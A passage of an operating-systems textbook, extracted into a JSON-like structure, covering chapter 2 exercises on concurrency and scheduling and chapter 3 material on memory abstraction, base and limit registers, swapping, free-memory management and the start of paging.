of CPU time per burst, plus one video at 25 frames/sec, with each frame\r\nrequiring 20 msec of CPU time. Is this system schedulable?\r\n53. Consider a system in which it is desired to separate policy and mechanism for the\r\nscheduling of kernel threads. Propose a means of achieving this goal.\r\n54. In the solution to the dining philosophers problem (Fig. 2-47), why is the state variable\r\nset to HUNGRY in the procedure take forks?\r\n55. Consider the procedure put forks in Fig. 2-47. Suppose that the variable state[i] was\r\nset to THINKING after the two calls to test, rather than before. How would this change\r\naffect the solution?\r\n56. The readers and writers problem can be formulated in several ways with regard to\r\nwhich category of processes can be started when. Carefully describe three different\r\nvariations of the problem, each one favoring (or not favoring) some category of proc\u0002esses. For each variation, specify what happens when a reader or a writer becomes\r\nready to access the database, and what happens when a process is finished.\r\n57. Write a shell script that produces a file of sequential numbers by reading the last num\u0002ber in the file, adding 1 to it, and then appending it to the file. Run one instance of the\nCHAP. 2 PROBLEMS 179\r\nscript in the background and one in the foreground, each accessing the same file. How\r\nlong does it take before a race condition manifests itself? What is the critical region?\r\nModify the script to prevent the race. (Hint: use\r\nln file file.lock\r\nto lock the data file.)\r\n58. Assume that you have an operating system that provides semaphores. Implement a\r\nmessage system. Write the procedures for sending and receiving messages.\r\n59. Solve the dining philosophers problem using monitors instead of semaphores.\r\n60. Suppose that a university wants to show off how politically correct it is by applying the\r\nU.S. Supreme Court’s ‘‘Separate but equal is inherently unequal’’ doctrine to gender as\r\nwell as race, ending its long-standing practice of gender-segregated bathrooms on cam\u0002pus. However, as a concession to tradition, it decrees that when a woman is in a bath\u0002room, other women may enter, but no men, and vice versa. A sign with a sliding\r\nmarker on the door of each bathroom indicates which of three possible states it is cur\u0002rently in:\r\n• Empty\r\n• Women present\r\n• Men present\r\nIn some programming language you like, write the following procedures:\r\nwoman wants to enter, man wants to enter, woman leaves, man leaves. You\r\nmay use whatever counters and synchronization techniques you like.\r\n61. Rewrite the program of Fig. 2-23 to handle more than two processes.\r\n62. Write a producer-consumer problem that uses threads and shares a common buffer.\r\nHowever, do not use semaphores or any other synchronization primitives to guard the\r\nshared data structures. Just let each thread access them when it wants to. Use sleep\r\nand wakeup to handle the full and empty conditions. See how long it takes for a fatal\r\nrace condition to occur. For example, you might have the producer print a number\r\nonce in a while. Do not print more than one number every minute because the I/O\r\ncould affect the race conditions.\r\n63. A process can be put into a round-robin queue more than once to give it a higher prior\u0002ity. Running multiple instances of a program each working on a different part of a data\r\npool can have the same effect. First write a program that tests a list of numbers for pri\u0002mality. Then devise a method to allow multiple instances of the program to run at once\r\nin such a way that no two instances of the program will work on the same number. Can\r\nyou in fact get through the list faster by running multiple copies of the program? Note\r\nthat your results will depend upon what else your computer is doing; on a personal\r\ncomputer running only instances of this program you would not expect an im\u0002provement, but on a system with other processes, you should be able to grab a bigger\r\nshare of the CPU this way.\r\n64. The objective of this exercise is to implement a multithreaded solution to find if a\r\ngiven number is a perfect number. N is a perfect number if the sum of all its factors,\r\nexcluding itself, is N; examples are 6 and 28. The input is an integer, N. The output is\n180 PROCESSES AND THREADS CHAP. 2\r\ntrue if the number is a perfect number and false otherwise. The main program will\r\nread the numbers N and P from the command line. The main process will spawn a set\r\nof P threads. The numbers from 1 to N will be partitioned among these threads so that\r\ntwo threads do not work on the name number. For each number in this set, the thread\r\nwill determine if the number is a factor of N. If it is, it adds the number to a shared\r\nbuffer that stores factors of N. The parent process waits till all the threads complete.\r\nUse the appropriate synchronization primitive here. The parent will then determine if\r\nthe input number is perfect, that is, if N is a sum of all its factors and then report\r\naccordingly. (Note: You can make the computation faster by restricting the numbers\r\nsearched from 1 to the square root of N.)\r\n65. Implement a program to count the frequency of words in a text file. The text file is\r\npartitioned into N segments. Each segment is processed by a separate thread that out\u0002puts the intermediate frequency count for its segment. The main process waits until all\r\nthe threads complete; then it computes the consolidated word-frequency data based on\r\nthe individual threads’ output.\n3\r\nMEMORY MANAGEMENT\r\nMain memory (RAM) is an important resource that must be very carefully\r\nmanaged. While the average home computer nowadays has 10,000 times more\r\nmemory than the IBM 7094, the largest computer in the world in the early 1960s,\r\nprograms are getting bigger faster than memories. To paraphrase Parkinson’s Law,\r\n‘‘Programs expand to fill the memory available to hold them.’’ In this chapter we\r\nwill study how operating systems create abstractions from memory and how they\r\nmanage them.\r\nWhat every programmer would like is a private, infinitely large, infinitely fast\r\nmemory that is also nonvolatile, that is, does not lose its contents when the electric\r\npower is switched off. While we are at it, why not make it inexpensive, too? Un\u0002fortunately, technology does not provide such memories at present. Maybe you\r\nwill discover how to do it.\r\nWhat is the second choice? Over the years, people discovered the concept of a\r\nmemory hierarchy, in which computers have a few meg abytes of very fast, expen\u0002sive, volatile cache memory, a few gigabytes of medium-speed, medium-priced,\r\nvolatile main memory, and a few terabytes of slow, cheap, nonvolatile magnetic or\r\nsolid-state disk storage, not to mention removable storage, such as DVDs and USB\r\nsticks. It is the job of the operating system to abstract this hierarchy into a useful\r\nmodel and then manage the abstraction.\r\nThe part of the operating system that manages (part of) the memory hierarchy\r\nis called the memory manager. Its job is to efficiently manage memory: keep\r\ntrack of which parts of memory are in use, allocate memory to processes when\r\nthey need it, and deallocate it when they are done.\r\n181"
      }
    }
  },
  "3 MEMORY MANAGEMENT": {
    "page": 212,
    "children": {
      "3.1 NO MEMORY ABSTRACTION": {
        "page": 213,
        "content": "3.1 NO MEMORY ABSTRACTION\r\nThe simplest memory abstraction is to have no abstraction at all. Early main\u0002frame computers (before 1960), early minicomputers (before 1970), and early per\u0002sonal computers (before 1980) had no memory abstraction. Every program simply\r\nsaw the physical memory. When a program executed an instruction like\r\nMOV REGISTER1,1000\r\nthe computer just moved the contents of physical memory location 1000 to REGIS\u0002TER1. Thus, the model of memory presented to the programmer was simply phys\u0002ical memory, a set of addresses from 0 to some maximum, each address corres\u0002ponding to a cell containing some number of bits, commonly eight.\r\nUnder these conditions, it was not possible to have two running programs in\r\nmemory at the same time. If the first program wrote a new value to, say, location\r\n2000, this would erase whatever value the second program was storing there. Noth\u0002ing would work and both programs would crash almost immediately.\r\nEven with the model of memory being just physical memory, sev eral options\r\nare possible. Three variations are shown in Fig. 3-1. The operating system may be\r\nat the bottom of memory in RAM (Random Access Memory), as shown in\r\nFig. 3-1(a), or it may be in ROM (Read-Only Memory) at the top of memory, as\r\nshown in Fig. 3-1(b), or the device drivers may be at the top of memory in a ROM\r\nand the rest of the system in RAM down below, as shown in Fig. 3-1(c). The first\r\nmodel was formerly used on mainframes and minicomputers but is rarely used any\r\nmore. The second model is used on some handheld computers and embedded sys\u0002tems. The third model was used by early personal computers (e.g., running MS\u0002DOS), where the portion of the system in the ROM is called the BIOS (Basic Input\r\nOutput System). Models (a) and (c) have the disadvantage that a bug in the user\r\nprogram can wipe out the operating system, possibly with disastrous results.\r\nWhen the system is organized in this way, generally only one process at a time\r\ncan be running. As soon as the user types a command, the operating system copies\r\nthe requested program from disk to memory and executes it. When the process fin\u0002ishes, the operating system displays a prompt character and waits for a user new\r\ncommand. When the operating system receives the command, it loads a new pro\u0002gram into memory, overwriting the first one.\nSEC. 3.1 NO MEMORY ABSTRACTION 183\r\n(a) (b) (c)\r\n0xFFF …\r\n0 00\r\nUser\r\nprogram\r\nUser\r\nprogram\r\nUser\r\nprogram\r\nOperating\r\nsystem in\r\nRAM\r\nOperating\r\nsystem in\r\nRAM\r\nOperating\r\nsystem in\r\nROM\r\nDevice\r\ndrivers in ROM\r\nFigure 3-1. Three simple ways of organizing memory with an operating system\r\nand one user process. Other possibilities also exist.\r\nOne way to get some parallelism in a system with no memory abstraction is to\r\nprogram with multiple threads. Since all threads in a process are supposed to see\r\nthe same memory image, the fact that they are forced to is not a problem. While\r\nthis idea works, it is of limited use since what people often want is unrelated pro\u0002grams to be running at the same time, something the threads abstraction does not\r\nprovide. Furthermore, any system that is so primitive as to provide no memory\r\nabstraction is unlikely to provide a threads abstraction.\r\nRunning Multiple Programs Without a Memory Abstraction\r\nHowever, even with no memory abstraction, it is possible to run multiple pro\u0002grams at the same time. What the operating system has to do is save the entire con\u0002tents of memory to a disk file, then bring in and run the next program. As long as\r\nthere is only one program at a time in memory, there are no conflicts. This concept\r\n(swapping) will be discussed below.\r\nWith the addition of some special hardware, it is possible to run multiple pro\u0002grams concurrently, even without swapping. The early models of the IBM 360\r\nsolved the problem as follows. Memory was divided into 2-KB blocks and each\r\nwas assigned a 4-bit protection key held in special registers inside the CPU. A ma\u0002chine with a 1-MB memory needed only 512 of these 4-bit registers for a total of\r\n256 bytes of key storage. The PSW (Program Status Word) also contained a 4-bit\r\nkey. The 360 hardware trapped any attempt by a running process to access memo\u0002ry with a protection code different from the PSW key. Since only the operating sys\u0002tem could change the protection keys, user processes were prevented from interfer\u0002ing with one another and with the operating system itself.\r\nNevertheless, this solution had a major drawback, depicted in Fig. 3-2. Here\r\nwe have two programs, each 16 KB in size, as shown in Fig. 3-2(a) and (b). The\r\nformer is shaded to indicate that it has a different memory key than the latter. The\n184 MEMORY MANAGEMENT CHAP. 3\r\nfirst program starts out by jumping to address 24, which contains a MOV instruc\u0002tion. The second program starts out by jumping to address 28, which contains a\r\nCMP instruction. The instructions that are not relevant to this discussion are not\r\nshown. When the two programs are loaded consecutively in memory starting at\r\naddress 0, we have the situation of Fig. 3-2(c). For this example, we assume the\r\noperating system is in high memory and thus not shown.\r\n0\r\n4\r\n8\r\n12\r\n16\r\n20\r\n24\r\n28\r\n0\r\n4\r\n8\r\n12\r\n16\r\n20\r\n24\r\n28\r\n(a) (b)\r\n0\r\n4\r\n8\r\n12\r\n16\r\n20\r\n24\r\nADD 28\r\nJMP 24\r\nMOV\r\n(c)\r\n16384\r\n16388\r\n16392\r\n16396\r\n16400\r\n16404\r\n16408\r\n16412\r\nADD\r\nJMP 24\r\nMOV\r\n0 16380\r\nJMP 28\r\nCMP\r\n0 16380\r\n.\r\n.\r\n. .\r\n.\r\n. .\r\n.\r\n.\r\n16380\r\n.\r\n.\r\n.\r\nJMP 28\r\nCMP\r\n0\r\n0 32764\r\nFigure 3-2. Illustration of the relocation problem. (a) A 16-KB program.\r\n(b) Another 16-KB program. (c) The two programs loaded consecutively\r\ninto memory.\r\nAfter the programs are loaded, they can be run. Since they hav e different mem\u0002ory keys, neither one can damage the other. But the problem is of a different\r\nnature. When the first program starts, it executes the JMP 24 instruction, which\r\njumps to the instruction, as expected. This program functions normally.\r\nHowever, after the first program has run long enough, the operating system\r\nmay decide to run the second program, which has been loaded above the first one,\r\nat address 16,384. The first instruction executed is JMP 28, which jumps to the\r\nADD instruction in the first program, instead of the CMP instruction it is supposed\r\nto jump to. The program will most likely crash in well under 1 sec.\r\nThe core problem here is that the two programs both reference absolute physi\u0002cal memory. That is not what we want at all. What we want is that each program\nSEC. 3.1 NO MEMORY ABSTRACTION 185\r\ncan reference a private set of addresses local to it. We will show how this can be\r\nacomplished shortly. What the IBM 360 did as a stop-gap solution was modify the\r\nsecond program on the fly as it loaded it into memory using a technique known as\r\nstatic relocation. It worked like this. When a program was loaded at address\r\n16,384, the constant 16,384 was added to every program address during the load\r\nprocess (so ‘‘JMP 28’’ became ‘‘JMP 16,412’’, etc.).While this mechanism works\r\nif done right, it is not a very general solution and slows down loading. Fur\u0002thermore, it requires extra information in all executable programs to indicate which\r\nwords contain (relocatable) addresses and which do not. After all, the ‘‘28’’ in\r\nFig. 3-2(b) has to be relocated but an instruction like\r\nMOV REGISTER1,28\r\nwhich moves the number 28 to REGISTER1 must not be relocated. The loader\r\nneeds some way to tell what is an address and what is a constant.\r\nFinally, as we pointed out in Chap. 1, history tends to repeat itself in the com\u0002puter world. While direct addressing of physical memory is but a distant memory\r\non mainframes, minicomputers, desktop computers, notebooks, and smartphones,\r\nthe lack of a memory abstraction is still common in embedded and smart card sys\u0002tems. Devices such as radios, washing machines, and microwave ovens are all full\r\nof software (in ROM) these days, and in most cases the software addresses abso\u0002lute memory. This works because all the programs are known in advance and users\r\nare not free to run their own software on their toaster.\r\nWhile high-end embedded systems (such as smartphones) have elaborate oper\u0002ating systems, simpler ones do not. In some cases, there is an operating system,\r\nbut it is just a library that is linked with the application program and provides sys\u0002tem calls for performing I/O and other common tasks. The e-Cos operating system\r\nis a common example of an operating system as library."
      },
      "3.2 A MEMORY ABSTRACTION: ADDRESS SPACES": {
        "page": 216,
        "children": {
          "3.2.1 The Notion of an Address Space": {
            "page": 217,
            "content": "3.2.1 The Notion of an Address Space\r\nTw o problems have to be solved to allow multiple applications to be in memo\u0002ry at the same time without interfering with each other: protection and relocation.\r\nWe looked at a primitive solution to the former used on the IBM 360: label chunks\r\nof memory with a protection key and compare the key of the executing process to\r\nthat of every memory word fetched. However, this approach by itself does not\r\nsolve the latter problem, although it can be solved by relocating programs as they\r\nare loaded, but this is a slow and complicated solution.\r\nA better solution is to invent a new abstraction for memory: the address space.\r\nJust as the process concept creates a kind of abstract CPU to run programs, the ad\u0002dress space creates a kind of abstract memory for programs to live in. An address\r\nspace is the set of addresses that a process can use to address memory. Each proc\u0002ess has its own address space, independent of those belonging to other processes\r\n(except in some special circumstances where processes want to share their address\r\nspaces).\r\nThe concept of an address space is very general and occurs in many contexts.\r\nConsider telephone numbers. In the United States and many other countries, a\r\nlocal telephone number is usually a 7-digit number. The address space for tele\u0002phone numbers thus runs from 0,000,000 to 9,999,999, although some numbers,\r\nsuch as those beginning with 000 are not used. With the growth of smartphones,\r\nmodems, and fax machines, this space is becoming too small, in which case more\r\ndigits have to be used. The address space for I/O ports on the x86 runs from 0 to\r\n16383. IPv4 addresses are 32-bit numbers, so their address space runs from 0 to\r\n232 − 1 (again, with some reserved numbers).\r\nAddress spaces do not have to be numeric. The set of .com Internet domains is\r\nalso an address space. This address space consists of all the strings of length 2 to\r\n63 characters that can be made using letters, numbers, and hyphens, followed by\r\n.com. By now you should get the idea. It is fairly simple.\r\nSomewhat harder is how to giv e each program its own address space, so ad\u0002dress 28 in one program means a different physical location than address 28 in an\u0002other program. Below we will discuss a simple way that used to be common but\r\nhas fallen into disuse due to the ability to put much more complicated (and better)\r\nschemes on modern CPU chips.\r\nBase and Limit Registers\r\nThis simple solution uses a particularly simple version of dynamic relocation.\r\nWhat it does is map each process’ address space onto a different part of physical\r\nmemory in a simple way. The classical solution, which was used on machines\r\nranging from the CDC 6600 (the world’s first supercomputer) to the Intel 8088 (the\r\nheart of the original IBM PC), is to equip each CPU with two special hardware\r\nregisters, usually called the base and limit registers. When these registers are used,\nSEC. 3.2 A MEMORY ABSTRACTION: ADDRESS SPACES 187\r\nprograms are loaded into consecutive memory locations wherever there is room\r\nand without relocation during loading, as shown in Fig. 3-2(c). When a process is\r\nrun, the base register is loaded with the physical address where its program begins\r\nin memory and the limit register is loaded with the length of the program. In\r\nFig. 3-2(c), the base and limit values that would be loaded into these hardware reg\u0002isters when the first program is run are 0 and 16,384, respectively. The values used\r\nwhen the second program is run are 16,384 and 32,768, respectively. If a third\r\n16-KB program were loaded directly above the second one and run, the base and\r\nlimit registers would be 32,768 and 16,384.\r\nEvery time a process references memory, either to fetch an instruction or read\r\nor write a data word, the CPU hardware automatically adds the base value to the\r\naddress generated by the process before sending the address out on the memory\r\nbus. Simultaneously, it checks whether the address offered is equal to or greater\r\nthan the value in the limit register, in which case a fault is generated and the access\r\nis aborted. Thus, in the case of the first instruction of the second program in\r\nFig. 3-2(c), the process executes a\r\nJMP 28\r\ninstruction, but the hardware treats it as though it were\r\nJMP 16412\r\nso it lands on the CMP instruction as expected. The settings of the base and limit\r\nregisters during the execution of the second program of Fig. 3-2(c) are shown in\r\nFig. 3-3.\r\nUsing base and limit registers is an easy way to give each process its own pri\u0002vate address space because every memory address generated automatically has the\r\nbase-register contents added to it before being sent to memory. In many imple\u0002mentations, the base and limit registers are protected in such a way that only the\r\noperating system can modify them. This was the case on the CDC 6600, but not on\r\nthe Intel 8088, which did not even hav e the limit register. It did have multiple base\r\nregisters, allowing program text and data, for example, to be independently relocat\u0002ed, but offered no protection from out-of-range memory references.\r\nA disadvantage of relocation using base and limit registers is the need to per\u0002form an addition and a comparison on every memory reference. Comparisons can\r\nbe done fast, but additions are slow due to carry-propagation time unless special\r\naddition circuits are used."
          },
          "3.2.2 Swapping": {
            "page": 218,
            "content": "3.2.2 Swapping\r\nIf the physical memory of the computer is large enough to hold all the proc\u0002esses, the schemes described so far will more or less do. But in practice, the total\r\namount of RAM needed by all the processes is often much more than can fit in\r\nmemory. On a typical Windows, OS X, or Linux system, something like 50–100\n188 MEMORY MANAGEMENT CHAP. 3\r\n0\r\n4\r\n8\r\n12\r\n16\r\n20\r\n24\r\n28\r\n(c)\r\nADD\r\nJMP 24\r\nMOV\r\nJMP 28\r\nCMP\r\n.\r\n.\r\n.\r\n0\r\n.\r\n.\r\n.\r\n0\r\n16384\r\n16388\r\n16392\r\n16396\r\n16400\r\n16404\r\n16408\r\n16412\r\n16380\r\n32764\r\n16384\r\n16384\r\nBase register\r\nLimit register\r\nFigure 3-3. Base and limit registers can be used to give each process a separate\r\naddress space.\r\nprocesses or more may be started up as soon as the computer is booted. For ex\u0002ample, when a Windows application is installed, it often issues commands so that\r\non subsequent system boots, a process will be started that does nothing except\r\ncheck for updates to the application. Such a process can easily occupy 5–10 MB of\r\nmemory. Other background processes check for incoming mail, incoming network\r\nconnections, and many other things. And all this is before the first user program is\r\nstarted. Serious user application programs nowadays, like Photoshop, can easily\r\nrequire 500 MB just to boot and many gigabytes once they start processing data.\r\nConsequently, keeping all processes in memory all the time requires a huge\r\namount of memory and cannot be done if there is insufficient memory.\r\nTw o general approaches to dealing with memory overload have been devel\u0002oped over the years. The simplest strategy, called swapping, consists of bringing in\r\neach process in its entirety, running it for a while, then putting it back on the disk.\r\nIdle processes are mostly stored on disk, so they do not take up any memory when\r\nthey are not running (although some of them wake up periodically to do their work,\r\nthen go to sleep again). The other strategy, called virtual memory, allows pro\u0002grams to run even when they are only partially in main memory. Below we will\r\nstudy swapping; in Sec. 3.3 we will examine virtual memory.\nSEC. 3.2 A MEMORY ABSTRACTION: ADDRESS SPACES 189\r\nThe operation of a swapping system is illustrated in Fig. 3-4. Initially, only\r\nprocess A is in memory. Then processes B and C are created or swapped in from\r\ndisk. In Fig. 3-4(d) A is swapped out to disk. Then D comes in and B goes out.\r\nFinally A comes in again. Since A is now at a different location, addresses con\u0002tained in it must be relocated, either by software when it is swapped in or (more\r\nlikely) by hardware during program execution. For example, base and limit regis\u0002ters would work fine here.\r\n(a)\r\nOperating\r\nsystem\r\nA\r\n(b)\r\nOperating\r\nsystem\r\n\r\n\r\nA\r\nB\r\n(c)\r\nOperating\r\nsystem\r\n\r\nA\r\nB\r\nC\r\n(d)\r\nTime\r\nOperating\r\nsystem\r\n\r\n\r\n\r\nB\r\nC\r\n(e)\r\nD\r\nOperating\r\nsystem\r\nC\r\nB\r\n\r\n(f)\r\nD\r\nOperating\r\nsystem\r\n\r\n\r\n\r\n\r\nC\r\n(g)\r\nD\r\nOperating\r\nsystem\r\n\r\nA\r\nC\r\nFigure 3-4. Memory allocation changes as processes come into memory and\r\nleave it. The shaded regions are unused memory.\r\nWhen swapping creates multiple holes in memory, it is possible to combine\r\nthem all into one big one by moving all the processes downward as far as possible.\r\nThis technique is known as memory compaction. It is usually not done because it\r\nrequires a lot of CPU time. For example, on a 16-GB machine that can copy 8\r\nbytes in 8 nsec, it would take about 16 sec to compact all of memory.\r\nA point that is worth making concerns how much memory should be allocated\r\nfor a process when it is created or swapped in. If processes are created with a fixed\r\nsize that never changes, then the allocation is simple: the operating system allo\u0002cates exactly what is needed, no more and no less.\r\nIf, however, processes’ data segments can grow, for example, by dynamically\r\nallocating memory from a heap, as in many programming languages, a problem oc\u0002curs whenever a process tries to grow. If a hole is adjacent to the process, it can be\r\nallocated and the process allowed to grow into the hole. On the other hand, if the\r\nprocess is adjacent to another process, the growing process will either have to be\r\nmoved to a hole in memory large enough for it, or one or more processes will have\r\nto be swapped out to create a large enough hole. If a process cannot grow in mem\u0002ory and the swap area on the disk is full, the process will have to suspended until\r\nsome space is freed up (or it can be killed).\n190 MEMORY MANAGEMENT CHAP. 3\r\nIf it is expected that most processes will grow as they run, it is probably a good\r\nidea to allocate a little extra memory whenever a process is swapped in or moved,\r\nto reduce the overhead associated with moving or swapping processes that no long\u0002er fit in their allocated memory. Howev er, when swapping processes to disk, only\r\nthe memory actually in use should be swapped; it is wasteful to swap the extra\r\nmemory as well. In Fig. 3-5(a) we see a memory configuration in which space for\r\ngrowth has been allocated to two processes.\r\n(a) (b)\r\nOperating\r\nsystem\r\nRoom for growth\r\nRoom for growth\r\nB-Stack\r\nA-Stack\r\nB-Data\r\nA-Data\r\nB-Program\r\nA-Program\r\n\r\nOperating\r\nsystem\r\nRoom for growth\r\nB\r\nA \r\nActually in use\r\nRoom for growth\r\nActually in use\r\nFigure 3-5. (a) Allocating space for a growing data segment. (b) Allocating\r\nspace for a growing stack and a growing data segment.\r\nIf processes can have two growing segments—for example, the data segment\r\nbeing used as a heap for variables that are dynamically allocated and released and a\r\nstack segment for the normal local variables and return addresses—an alternative\r\narrangement suggests itself, namely that of Fig. 3-5(b). In this figure we see that\r\neach process illustrated has a stack at the top of its allocated memory that is grow\u0002ing downward, and a data segment just beyond the program text that is growing\r\nupward. The memory between them can be used for either segment. If it runs out,\r\nthe process will either have to be moved to a hole with sufficient space, swapped\r\nout of memory until a large enough hole can be created, or killed."
          },
          "3.2.3 Managing Free Memory": {
            "page": 221,
            "content": "3.2.3 Managing Free Memory\r\nWhen memory is assigned dynamically, the operating system must manage it.\r\nIn general terms, there are two ways to keep track of memory usage: bitmaps and\r\nfree lists. In this section and the next one we will look at these two methods. In\nSEC. 3.2 A MEMORY ABSTRACTION: ADDRESS SPACES 191\r\nChapter 10, we will look at some specific memory allocators used in Linux (like\r\nbuddy and slab allocators) in more detail.\r\nMemory Management with Bitmaps\r\nWith a bitmap, memory is divided into allocation units as small as a few words\r\nand as large as several kilobytes. Corresponding to each allocation unit is a bit in\r\nthe bitmap, which is 0 if the unit is free and 1 if it is occupied (or vice versa). Fig\u0002ure 3-6 shows part of memory and the corresponding bitmap. \r\n\r\n\r\n(a)\r\n(b) (c)\r\nA B C DE\r\n8 16 24\r\nHole Starts\r\nat 18\r\nLength\r\n2\r\nProcess\r\nP05 H53 P86 P 14 4\r\nH 18 2 P 20 6 P 26 3 H 29 3 X\r\n1 1 1 1 1 0 0 0\r\n1 1 1 1 1 1 1 1\r\n1 1 0 0 1 1 1 1\r\n1 1 1 1 1 0 0 0\r\nFigure 3-6. (a) A part of memory with fiv e processes and three holes. The tick\r\nmarks show the memory allocation units. The shaded regions (0 in the bitmap)\r\nare free. (b) The corresponding bitmap. (c) The same information as a list.\r\nThe size of the allocation unit is an important design issue. The smaller the al\u0002location unit, the larger the bitmap. However, even with an allocation unit as small\r\nas 4 bytes, 32 bits of memory will require only 1 bit of the map. A memory of 32n\r\nbits will use n map bits, so the bitmap will take up only 1/32 of memory. If the al\u0002location unit is chosen large, the bitmap will be smaller, but appreciable memory\r\nmay be wasted in the last unit of the process if the process size is not an exact mul\u0002tiple of the allocation unit.\r\nA bitmap provides a simple way to keep track of memory words in a fixed\r\namount of memory because the size of the bitmap depends only on the size of\r\nmemory and the size of the allocation unit. The main problem is that when it has\r\nbeen decided to bring a k-unit process into memory, the memory manager must\r\nsearch the bitmap to find a run of k consecutive 0 bits in the map. Searching a bit\u0002map for a run of a given length is a slow operation (because the run may straddle\r\nword boundaries in the map); this is an argument against bitmaps.\n192 MEMORY MANAGEMENT CHAP. 3\r\nMemory Management with Linked Lists\r\nAnother way of keeping track of memory is to maintain a linked list of allo\u0002cated and free memory segments, where a segment either contains a process or is\r\nan empty hole between two processes. The memory of Fig. 3-6(a) is represented in\r\nFig. 3-6(c) as a linked list of segments. Each entry in the list specifies a hole (H) or\r\nprocess (P), the address at which it starts, the length, and a pointer to the next item.\r\nIn this example, the segment list is kept sorted by address. Sorting this way has\r\nthe advantage that when a process terminates or is swapped out, updating the list is\r\nstraightforward. A terminating process normally has two neighbors (except when\r\nit is at the very top or bottom of memory). These may be either processes or holes,\r\nleading to the four combinations shown in Fig. 3-7. In Fig. 3-7(a) updating the list\r\nrequires replacing a P by an H. In Fig. 3-7(b) and Fig. 3-7(c), two entries are coa\u0002lesced into one, and the list becomes one entry shorter. In Fig. 3-7(d), three entries\r\nare merged and two items are removed from the list.\r\nSince the process table slot for the terminating process will normally point to\r\nthe list entry for the process itself, it may be more convenient to have the list as a\r\ndouble-linked list, rather than the single-linked list of Fig. 3-6(c). This structure\r\nmakes it easier to find the previous entry and to see if a merge is possible.\r\nbecomes\r\nbecomes\r\nbecomes\r\nbecomes\r\n(a) A X B\r\n(b) A X\r\n\r\n(d) X\r\n(c) X B \r\nBefore X terminates \r\nA B\r\nA\r\nB\r\n\r\nAfter X terminates\r\nFigure 3-7. Four neighbor combinations for the terminating process, X.\r\nWhen the processes and holes are kept on a list sorted by address, several algo\u0002rithms can be used to allocate memory for a created process (or an existing process\r\nbeing swapped in from disk). We assume that the memory manager knows how\r\nmuch memory to allocate. The simplest algorithm is first fit. The memory man\u0002ager scans along the list of segments until it finds a hole that is big enough. The\r\nhole is then broken up into two pieces, one for the process and one for the unused\r\nmemory, except in the statistically unlikely case of an exact fit. First fit is a fast al\u0002gorithm because it searches as little as possible.\r\nA minor variation of first fit is next fit. It works the same way as first fit, ex\u0002cept that it keeps track of where it is whenever it finds a suitable hole. The next\r\ntime it is called to find a hole, it starts searching the list from the place where it left\r\noff last time, instead of always at the beginning, as first fit does. Simulations by\r\nBays (1977) show that next fit gives slightly worse performance than first fit.\nSEC. 3.2 A MEMORY ABSTRACTION: ADDRESS SPACES 193\r\nAnother well-known and widely used algorithm is best fit. Best fit searches\r\nthe entire list, from beginning to end, and takes the smallest hole that is adequate.\r\nRather than breaking up a big hole that might be needed later, best fit tries to find a\r\nhole that is close to the actual size needed, to best match the request and the avail\u0002able holes.\r\nAs an example of first fit and best fit, consider Fig. 3-6 again. If a block of\r\nsize 2 is needed, first fit will allocate the hole at 5, but best fit will allocate the hole\r\nat 18.\r\nBest fit is slower than first fit because it must search the entire list every time it\r\nis called. Somewhat surprisingly, it also results in more wasted memory than first\r\nfit or next fit because it tends to fill up memory with tiny, useless holes. First fit\r\ngenerates larger holes on the average.\r\nTo get around the problem of breaking up nearly exact matches into a process\r\nand a tiny hole, one could think about worst fit, that is, always take the largest\r\navailable hole, so that the new hole will be big enough to be useful. Simulation has\r\nshown that worst fit is not a very good idea either.\r\nAll four algorithms can be speeded up by maintaining separate lists for proc\u0002esses and holes. In this way, all of them devote their full energy to inspecting\r\nholes, not processes. The inevitable price that is paid for this speedup on allocation\r\nis the additional complexity and slowdown when deallocating memory, since a\r\nfreed segment has to be removed from the process list and inserted into the hole\r\nlist.\r\nIf distinct lists are maintained for processes and holes, the hole list may be kept\r\nsorted on size, to make best fit faster. When best fit searches a list of holes from\r\nsmallest to largest, as soon as it finds a hole that fits, it knows that the hole is the\r\nsmallest one that will do the job, hence the best fit. No further searching is needed,\r\nas it is with the single-list scheme. With a hole list sorted by size, first fit and best\r\nfit are equally fast, and next fit is pointless.\r\nWhen the holes are kept on separate lists from the processes, a small optimiza\u0002tion is possible. Instead of having a separate set of data structures for maintaining\r\nthe hole list, as is done in Fig. 3-6(c), the information can be stored in the holes.\r\nThe first word of each hole could be the hole size, and the second word a pointer to\r\nthe following entry. The nodes of the list of Fig. 3-6(c), which require three words\r\nand one bit (P/H), are no longer needed.\r\nYet another allocation algorithm is quick fit, which maintains separate lists for\r\nsome of the more common sizes requested. For example, it might have a table with\r\nn entries, in which the first entry is a pointer to the head of a list of 4-KB holes, the\r\nsecond entry is a pointer to a list of 8-KB holes, the third entry a pointer to 12-KB\r\nholes, and so on. Holes of, say, 21 KB, could be put either on the 20-KB list or on\r\na special list of odd-sized holes.\r\nWith quick fit, finding a hole of the required size is extremely fast, but it has\r\nthe same disadvantage as all schemes that sort by hole size, namely, when a proc\u0002ess terminates or is swapped out, finding its neighbors to see if a merge with them\n194 MEMORY MANAGEMENT CHAP. 3\r\nis possible is quite expensive. If merging is not done, memory will quickly frag\u0002ment into a large number of small holes into which no processes fit."
          }
        }
      },
      "3.3 VIRTUAL MEMORY": {
        "page": 225,
        "children": {
          "3.3.1 Paging": {
            "page": 226,
            "content": "3.3.1 Paging\r\nMost virtual memory systems use a technique called paging, which we will\r\nnow describe. On any computer, programs reference a set of memory addresses.\r\nWhen a program executes an instruction like\r\nMOV REG,1000\r\nit does so to copy the contents of memory address 1000 to REG (or vice versa, de\u0002pending on the computer). Addresses can be generated using indexing, base regis\u0002ters, segment registers, and other ways.\r\nCPU\r\npackage\r\nCPU\r\nThe CPU sends virtual\r\naddresses to the MMU\r\nThe MMU sends physical\r\naddresses to the memory\r\nMemory\r\nmanagement\r\nunit\r\nMemory Disk\r\ncontroller\r\nBus\r\nFigure 3-8. The position and function of the MMU. Here the MMU is shown as\r\nbeing a part of the CPU chip because it commonly is nowadays. However, logi\u0002cally it could be a separate chip and was years ago.\r\nThese program-generated addresses are called virtual addresses and form the\r\nvirtual address space. On computers without virtual memory, the virtual address\n196 MEMORY MANAGEMENT CHAP. 3\r\nis put directly onto the memory bus and causes the physical memory word with the\r\nsame address to be read or written. When virtual memory is used, the virtual ad\u0002dresses do not go directly to the memory bus. Instead, they go to an MMU (Mem\u0002ory Management Unit) that maps the virtual addresses onto the physical memory\r\naddresses, as illustrated in Fig. 3-8.\r\nA very simple example of how this mapping works is shown in Fig. 3-9. In\r\nthis example, we have a computer that generates 16-bit addresses, from 0 up to\r\n64K − 1. These are the virtual addresses. This computer, howev er, has only 32 KB\r\nof physical memory. So although 64-KB programs can be written, they cannot be\r\nloaded into memory in their entirety and run. A complete copy of a program’s 